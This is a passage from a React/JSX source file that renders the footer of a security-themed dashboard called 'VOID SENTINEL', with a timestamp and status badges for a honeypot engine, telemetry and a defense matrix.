        <div className="max-w-screen-2xl mx-auto flex items-center justify-between gap-4 flex-wrap">
          <div className="flex items-center gap-3">
            <span className="text-xs text-zinc-700 font-mono">VOID SENTINEL v2.1.0</span>
            <span className="text-zinc-800">·</span>
            <span className="text-xs text-zinc-700 font-mono cursor">{new Date().toUTCString().split(' ').slice(0,5).join(' ')}</span>
          </div>
          <div className="flex items-center gap-4">
            {[
              { dot:'bg-violet-500',  label:'Honeypot Engine', status:'ONLINE',    col:'text-violet-500' },
              { dot:'bg-emerald-500 radar-dot', label:'Telemetry',      status:'STREAMING', col:'text-emerald-500' },
              { dot: matrixActive ? 'bg-violet-400' : 'bg-zinc-600', label:'Defense Matrix', status: matrixActive ? 'ACTIVE' : 'BYPASSED', col: matrixActive ? 'text-violet-400' : 'text-zinc-600' },
            ].map(({ dot, label, status, col }) => (
              <div key={label} className="flex items-center gap-1.5">
                <div className={`w-1.5 h-1.5 rounded-full ${dot}`}/>
                <span className="text-xs text-zinc-700">{label}</span>
                <span className={`text-xs font-semibold ${col}`}>{status}</span>
              </div>
            ))}
          </div>
        </div>
      </footer>
    </div>
  );
};

/* Mount */
ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
